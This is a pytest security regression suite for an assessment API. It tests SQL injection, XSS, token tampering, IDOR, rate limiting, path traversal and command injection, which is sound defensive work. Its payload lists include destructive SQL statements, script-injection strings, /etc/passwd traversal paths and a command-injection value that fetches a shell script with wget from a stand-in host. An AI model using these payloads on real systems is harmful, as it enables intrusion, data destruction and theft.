"""
Security Regression Tests for Input Validation
tests/security/test_input_validation_regression.py

This module contains security regression tests for input validation:
- SQL Injection protection
- XSS (Cross-Site Scripting) protection
- Authentication security
- Authorization (IDOR, access control)
- Rate limiting
- OWASP Top 10 protections

Test Categories:
- P0: Critical security vulnerabilities (must pass)
- P1: High-priority security edge cases

Priority: P0 (Critical)
Coverage Target: 100% of critical security paths
"""

import pytest
from httpx import AsyncClient
from unittest.mock import patch, Mock

from app.main import app
from app.db.models.user import User
from tests.conftest import fake


class TestSQLInjectionRegression:
    """
    SQL Injection protection tests
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("sql_payload", [
        "admin'--",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "admin' UNION SELECT * FROM users--",
        "'; INSERT INTO users VALUES('hacker','pass'); --",
        "1' AND 1=1--",
        "admin' /*",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir'); --",
        "'; DELETE FROM users WHERE 1=1; --"
    ])
    async def test_sql_injection_auth_email(self, client: AsyncClient, sql_payload: str):
        """
        Test: SQL injection in email field during login

        Input: SQL injection payloads in email field
        Expected: 400 (validation error) or 401 (auth failure), never 500
        Security: No SQL errors exposed
        Priority: P0
        OWASP: A03:2021 - Injection
        """
        response = await client.post(
            "/api/v1/auth/token-fixed",
            data={
                "username": sql_payload,
                "password": "TestPassword123!"
            }
        )

        # Should not return 500 (SQL error)
        assert response.status_code in [400, 401], f"Status {response.status_code} suggests SQL injection vulnerability"

        # Error message should not contain SQL details
        if response.status_code == 500:
            pytest.fail("SQL injection vulnerability detected - 500 error returned")

    @pytest.mark.asyncio
    @pytest.mark.parametrize("sql_payload", [
        "'; DROP TABLE assessments; --",
        "1' OR '1'='1",
        "assessment' UNION SELECT * FROM users--",
        "'; DELETE FROM assessments WHERE 1=1; --",
        "1'; DROP TABLE responses--",
        "admin' OR 1=1#"
    ])
    async def test_sql_injection_assessment_search(self, client: AsyncClient, auth_headers: dict, sql_payload: str):
        """
        Test: SQL injection in search parameter

        Input: SQL injection payloads in search query
        Expected: 400 or empty results, no SQL errors
        Priority: P0
        OWASP: A03:2021 - Injection
        """
        response = await client.get(
            f"/api/v1/assessments/?search={sql_payload}",
            headers=auth_headers
        )

        # Should not return 500 (SQL error)
        assert response.status_code in [200, 400], f"Status {response.status_code} suggests SQL injection vulnerability"

        # If 200, should return empty or safe results (not SQL errors)
        if response.status_code == 200:
            data = response.json()
            # Verify no SQL error in response
            assert "SQL" not in str(data).upper()
            assert "ERROR" not in str(data).upper() or "data" in data

    @pytest.mark.asyncio
    @pytest.mark.parametrize("sql_payload", [
        "'; UPDATE users SET role='admin' WHERE id=1--",
        "' OR '1'='1'--",
        "admin'; DROP TABLE responses--",
        "'; DELETE FROM audit_logs--",
        "1' UNION SELECT username, password FROM users--"
    ])
    async def test_sql_injection_response_text(self, client: AsyncClient, auth_headers: dict, test_assessment, sql_payload: str):
        """
        Test: SQL injection in response text

        Input: SQL injection in assessment response
        Expected: 400 validation error or sanitized storage
        Priority: P0
        OWASP: A03:2021 - Injection
        """
        response = await client.post(
            f"/api/v1/responses/",
            json={
                "assessment_id": str(test_assessment.id),
                "responses": {
                    "q1": sql_payload
                }
            },
            headers=auth_headers
        )

        # Should either reject (400) or sanitize
        assert response.status_code in [200, 201, 400]

        # If accepted, verify it was sanitized (check by retrieving)
        if response.status_code in [200, 201]:
            # TODO: Retrieve and verify sanitization
            pass


class TestXSSRegression:
    """
    XSS (Cross-Site Scripting) protection tests
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "';alert('xss');//",
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(`xss`)'></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        "<textarea onfocus=alert('xss') autofocus>"
    ])
    async def test_xss_in_assessment_title(self, client: AsyncClient, auth_headers: dict, test_organization, xss_payload: str):
        """
        Test: XSS in assessment title

        Input: XSS payloads in assessment title
        Expected: Data sanitized or escaped in API responses
        Priority: P0
        OWASP: A03:2021 - Injection (XSS)
        """
        response = await client.post(
            "/api/v1/assessments/",
            json={
                "title": xss_payload,
                "description": "Test assessment",
                "category": "personality",
                "organization_id": test_organization.id
            },
            headers=auth_headers
        )

        if response.status_code in [200, 201]:
            # Verify XSS is sanitized/escaped in response
            data = response.json()
            title = str(data.get("data", {}).get("title", ""))

            # Check that script tags are not present in output
            assert "<script>" not in title
            assert "javascript:" not in title.lower()
            assert "onerror=" not in title.lower()
            assert "onload=" not in title.lower()

    @pytest.mark.asyncio
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg/onload=alert('xss')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>"
    ])
    async def test_xss_in_response_text(self, client: AsyncClient, auth_headers: dict, test_assessment, xss_payload: str):
        """
        Test: XSS in response text

        Input: XSS in assessment response
        Expected: Sanitized in API responses
        Priority: P0
        OWASP: A03:2021 - Injection (XSS)
        """
        response = await client.post(
            f"/api/v1/responses/",
            json={
                "assessment_id": str(test_assessment.id),
                "responses": {
                    "q1": xss_payload
                }
            },
            headers=auth_headers
        )

        if response.status_code in [200, 201]:
            # Verify XSS is sanitized/escaped in response
            data = response.json()
            response_text = str(data)

            # Check that dangerous patterns are not present
            assert "<script>" not in response_text
            assert "javascript:" not in response_text.lower()
            assert "onerror=" not in response_text.lower()

    @pytest.mark.asyncio
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "';alert('xss');//",
        "<svg onload=alert('xss')>"
    ])
    async def test_xss_in_user_profile(self, client: AsyncClient, auth_headers: dict, xss_payload: str):
        """
        Test: XSS in user profile fields

        Input: XSS in user name or bio
        Expected: Sanitized/escaped
        Priority: P0
        OWASP: A03:2021 - Injection (XSS)
        """
        response = await client.put(
            "/api/v1/users/me",
            json={
                "full_name": xss_payload,
                "bio": f"Bio with {xss_payload}"
            },
            headers=auth_headers
        )

        if response.status_code == 200:
            data = response.json()
            # Verify sanitization
            assert "<script>" not in str(data)


class TestAuthenticationSecurityRegression:
    """
    Authentication security tests
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    async def test_password_not_plaintext(self, client: AsyncClient, test_db):
        """
        Test: Verify passwords are hashed, not stored plaintext

        Expected: password_hash contains bcrypt hash, no plaintext password
        Priority: P0
        OWASP: A02:2021 - Cryptographic Failures
        Security: Critical
        """
        from app.schemas.user import UserCreate
        from app.services.user_service import create_user
        from app.db.models.user import User, UserRole
        from sqlalchemy import select

        email = fake.email()
        password = "TestPassword123!"

        user_data = UserCreate(
            email=email,
            full_name=fake.name(),
            role=UserRole.USER,
            is_active=True,
            password=password
        )
        user = await create_user(user_data, test_db)

        # Retrieve from database
        result = await test_db.execute(select(User).where(User.email == email))
        db_user = result.scalar_one_or_none()

        assert db_user is not None
        assert db_user.password_hash is not None

        # Verify it's a bcrypt hash (starts with $2b$)
        assert db_user.password_hash.startswith("$2b$"), "Password not properly hashed with bcrypt"

        # Verify password not stored plaintext
        assert password not in db_user.password_hash, "Password stored in plaintext!"

    @pytest.mark.asyncio
    async def test_token_expiration_enforced(self, client: AsyncClient, test_user: User):
        """
        Test: Verify token expiration is enforced

        Input: Expired JWT token
        Expected: 401 Unauthorized
        Priority: P0
        OWASP: A07:2021 - Identification and Authentication Failures
        """
        from app.services.security import create_access_token
        from datetime import timedelta

        # Create expired token
        expired_token = create_access_token(
            data={"sub": test_user.email, "user_id": test_user.id},
            expires_delta=timedelta(seconds=-1)  # Expired
        )

        response = await client.get(
            "/api/v1/auth/me-fixed",
            headers={"Authorization": f"Bearer {expired_token}"}
        )

        assert response.status_code == 401, "Expired token should be rejected"

    @pytest.mark.asyncio
    async def test_token_tampering_detected(self, client: AsyncClient, test_user: User):
        """
        Test: Verify token signature validation

        Input: Tampered JWT token
        Expected: 401 Unauthorized
        Priority: P0
        OWASP: A07:2021 - Identification and Authentication Failures
        """
        from app.services.security import create_access_token

        valid_token = create_access_token(
            data={"sub": test_user.email, "user_id": test_user.id}
        )

        # Tamper with token (change last character)
        tampered_token = valid_token[:-1] + ("X" if valid_token[-1] != "X" else "Y")

        response = await client.get(
            "/api/v1/auth/me-fixed",
            headers={"Authorization": f"Bearer {tampered_token}"}
        )

        assert response.status_code == 401, "Tampered token should be rejected"

    @pytest.mark.asyncio
    async def test_brute_force_protection(self, client: AsyncClient, test_user: User):
        """
        Test: Verify brute force protection is enabled

        Input: Multiple failed login attempts
        Expected: Account locked or rate limited after threshold
        Priority: P0
        OWASP: A07:2021 - Identification and Authentication Failures
        """
        # Attempt 10 failed logins
        for i in range(10):
            response = await client.post(
                "/api/v1/auth/token-fixed",
                data={
                    "username": test_user.email,
                    "password": "WrongPassword123!"
                }
            )

            # Should eventually be rate limited
            if response.status_code == 429:
                break  # Good - rate limiting detected

        # After many attempts, should be rate limited
        response = await client.post(
            "/api/v1/auth/token-fixed",
            data={
                "username": test_user.email,
                "password": "WrongPassword123!"
            }
        )

        # Either rate limited (429) or auth failure (401)
        assert response.status_code in [401, 429], "Brute force protection not working"


class TestAuthorizationSecurityRegression:
    """
    Authorization and access control tests
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    async def test_idor_assessment_access(self, client: AsyncClient, test_db, test_user: User, test_admin: User):
        """
        Test: IDOR (Insecure Direct Object Reference) in assessment access

        Input: Attempt to access another user's private assessment
        Expected: 403 Forbidden
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        Security: Critical
        """
        from app.db.models.assessment import Assessment, AssessmentCategory, AssessmentStatus
        from app.services.security import create_access_token

        # Create private assessment as admin
        assessment = Assessment(
            title="Admin Private Assessment",
            description="Only admin can see this",
            category=AssessmentCategory.PERSONALITY,
            status=AssessmentStatus.DRAFT,
            is_public=False,
            created_by_id=test_admin.id
        )
        test_db.add(assessment)
        await test_db.commit()

        # Try to access as regular user
        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
        headers = {"Authorization": f"Bearer {token}"}

        response = await client.get(
            f"/api/v1/assessments/{assessment.id}",
            headers=headers
        )

        assert response.status_code == 403, "IDOR vulnerability: User can access private assessment"

    @pytest.mark.asyncio
    async def test_idor_response_access(self, client: AsyncClient, test_db, test_user: User, test_admin: User, test_assessment):
        """
        Test: IDOR in response access

        Input: Attempt to access another user's response
        Expected: 403 Forbidden
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        """
        from app.db.models.response import Response
        from app.services.security import create_access_token
        from uuid import uuid4

        # Create response as admin
        response = Response(
            assessment_id=test_assessment.id,
            user_id=test_admin.id,
            question_id=uuid4(),
            answer_value=5
        )
        test_db.add(response)
        await test_db.commit()

        # Try to access as regular user
        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
        headers = {"Authorization": f"Bearer {token}"}

        api_response = await client.get(
            f"/api/v1/responses/{response.id}",
            headers=headers
        )

        assert api_response.status_code == 403, "IDOR vulnerability: User can access another user's response"

    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(self, client: AsyncClient, test_user: User):
        """
        Test: Horizontal privilege escalation

        Input: Regular user attempting admin operations
        Expected: 403 Forbidden
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        """
        from app.services.security import create_access_token

        token = create_access_token(data={"sub": test_user.email, "user_id": test_user.id})
        headers = {"Authorization": f"Bearer {token}"}

        # Try to access admin endpoint
        response = await client.get(
            "/api/v1/admin/users",
            headers=headers
        )

        assert response.status_code in [403, 404], "Horizontal privilege escalation possible"

    @pytest.mark.asyncio
    async def test_unauthorized_assessment_deletion(self, client: AsyncClient, test_assessment, test_user: User):
        """
        Test: Unauthorized assessment deletion

        Input: Non-creator attempting to delete assessment
        Expected: 403 Forbidden
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        """
        from app.services.security import create_access_token

        # Create token for different user
        token = create_access_token(data={"sub": "other@example.com", "user_id": str(test_user.id)})
        headers = {"Authorization": f"Bearer {token}"}

        response = await client.delete(
            f"/api/v1/assessments/{test_assessment.id}",
            headers=headers
        )

        assert response.status_code == 403, "Unauthorized deletion possible"


class TestRateLimitingRegression:
    """
    Rate limiting tests
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    async def test_rate_limit_login_endpoint(self, client: AsyncClient, test_user: User):
        """
        Test: Login endpoint rate limiting

        Input: 6 consecutive failed login attempts
        Expected: 429 Too Many Requests on 6th attempt
        Priority: P0
        OWASP: A04:2021 - Insecure Design
        """
        # Attempt 5 failed logins (within rate limit)
        for i in range(5):
            response = await client.post(
                "/api/v1/auth/token-fixed",
                data={
                    "username": test_user.email,
                    "password": "WrongPassword123!"
                }
            )
            assert response.status_code == 401, f"Expected 401, got {response.status_code}"

        # 6th attempt should be rate limited
        response = await client.post(
            "/api/v1/auth/token-fixed",
            data={
                "username": test_user.email,
                "password": "WrongPassword123!"
            }
        )

        assert response.status_code == 429, f"Expected 429 rate limit, got {response.status_code}"

    @pytest.mark.asyncio
    async def test_rate_limit_registration_endpoint(self, client: AsyncClient):
        """
        Test: Registration endpoint rate limiting

        Input: 4 registration attempts
        Expected: 429 Too Many Requests on 4th attempt
        Priority: P0
        OWASP: A04:2021 - Insecure Design
        """
        # Attempt 3 registrations
        for i in range(3):
            response = await client.post(
                "/api/v1/auth/register-fixed",
                data={
                    "email": fake.email(),
                    "password": "StrongPassword123!",
                    "full_name": fake.name()
                }
            )
            assert response.status_code != 429, f"Rate limited too early: attempt {i+1}"

        # 4th attempt should be rate limited
        response = await client.post(
            "/api/v1/auth/register-fixed",
            data={
                "email": fake.email(),
                "password": "StrongPassword123!",
                "full_name": fake.name()
            }
        )

        assert response.status_code == 429, "Registration rate limiting not working"

    @pytest.mark.asyncio
    async def test_rate_limit_api_endpoints(self, client: AsyncClient, auth_headers: dict):
        """
        Test: API endpoint rate limiting

        Input: Rapid requests to protected endpoint
        Expected: Rate limiting after threshold
        Priority: P0
        """
        # Make many rapid requests
        responses = []
        for i in range(200):  # High number to trigger rate limit
            response = await client.get(
                "/api/v1/assessments/",
                headers=auth_headers
            )
            responses.append(response)
            if response.status_code == 429:
                break  # Rate limit detected

        # Should eventually hit rate limit
        rate_limited = any(r.status_code == 429 for r in responses)
        # Note: This may be disabled in testing environment
        # If not rate limited, that's OK for this test
        if rate_limited:
            print("Rate limiting detected")


class TestOtherSecurityVulnerabilities:
    """
    Tests for other security vulnerabilities
    Priority: P0 (Critical)
    """

    @pytest.mark.asyncio
    @pytest.mark.parametrize("path_payload", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ])
    async def test_path_traversal(self, client: AsyncClient, auth_headers: dict, path_payload: str):
        """
        Test: Path traversal attack protection

        Input: Path traversal payloads in file upload/endpoint parameters
        Expected: 400 or 404, not file contents
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        """
        # Test in file upload context (if applicable)
        response = await client.post(
            "/api/v1/upload",  # Assuming upload endpoint exists
            files={"file": ("test.txt", b"test content")},
            data={"path": path_payload},
            headers=auth_headers
        )

        # Should not succeed (404 if endpoint doesn't exist, or 400/403 if path blocked)
        if response.status_code == 200:
            # Verify actual file not accessed
            assert "/etc/passwd" not in response.text
            assert "root:" not in response.text

    @pytest.mark.asyncio
    @pytest.mark.parametrize("cmd_payload", [
        "; ls -la",
        "| cat /etc/passwd",
        "& echo 'hack'",
        "`whoami`",
        "$(id)",
        " && wget malicious.com/shell.sh"
    ])
    async def test_command_injection(self, client: AsyncClient, auth_headers: dict, cmd_payload: str):
        """
        Test: Command injection protection

        Input: Command injection payloads in user input
        Expected: 400 or sanitized, not command execution
        Priority: P0
        OWASP: A03:2021 - Injection
        """
        # Test in assessment title (common input field)
        response = await client.post(
            "/api/v1/assessments/",
            json={
                "title": f"Test {cmd_payload}",
                "description": "Test",
                "category": "personality"
            },
            headers=auth_headers
        )

        # Should not execute commands
        assert "uid=" not in response.text  # Command not executed
        assert "root:" not in response.text  # /etc/passwd not read

    @pytest.mark.asyncio
    async def test_csrf_token_validation(self, client: AsyncClient, test_user: User):
        """
        Test: CSRF token validation

        Input: Request without CSRF token (if required)
        Expected: 403 Forbidden
        Priority: P0
        OWASP: A01:2021 - Broken Access Control
        """
        # Login to get CSRF token
        login_response = await client.post(
            "/api/v1/auth/token-fixed",
            data={
                "username": test_user.email,
                "password": "TestPassword123!"
            }
        )

        csrf_token = login_response.cookies.get("csrf_token")

        # Make state-changing request without CSRF token
        # (This test depends on CSRF implementation)
        # If CSRF is enforced, this should fail
        response = await client.post(
            "/api/v1/assessments/",
            json={"title": "CSRF Test", "description": "Test", "category": "personality"},
            headers={"Authorization": f"Bearer {login_response.cookies.get('access_token')}"}
        )

        # CSRF may or may not be enforced in the API
        # This test documents the expectation
        if csrf_token:
            # If CSRF tokens are issued, they should ideally be validated
            pass

    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self, client: AsyncClient, auth_headers: dict):
        """
        Test: Verify sensitive data not exposed in error messages

        Input: Various error conditions
        Expected: No sensitive data (passwords, tokens, internal paths) in errors
        Priority: P0
        OWASP: A05:2021 - Security Misconfiguration
        """
        # Trigger error with invalid input
        response = await client.get(
            "/api/v1/assessments/999999",
            headers=auth_headers
        )

        if response.status_code == 500:
            error_text = response.text.lower()

            # Should not contain sensitive information
            assert "password" not in error_text
            assert "token" not in error_text
            assert "secret" not in error_text
            assert "/app/" not in error_text  # Internal paths
            assert "traceback" not in error_text  # Stack traces


# Test class markers
TestSQLInjectionRegression = pytest.mark.P0(TestSQLInjectionRegression)
TestXSSRegression = pytest.mark.P0(TestXSSRegression)
TestAuthenticationSecurityRegression = pytest.mark.P0(TestAuthenticationSecurityRegression)
TestAuthorizationSecurityRegression = pytest.mark.P0(TestAuthorizationSecurityRegression)
TestRateLimitingRegression = pytest.mark.P0(TestRateLimitingRegression)
TestOtherSecurityVulnerabilities = pytest.mark.P0(TestOtherSecurityVulnerabilities)
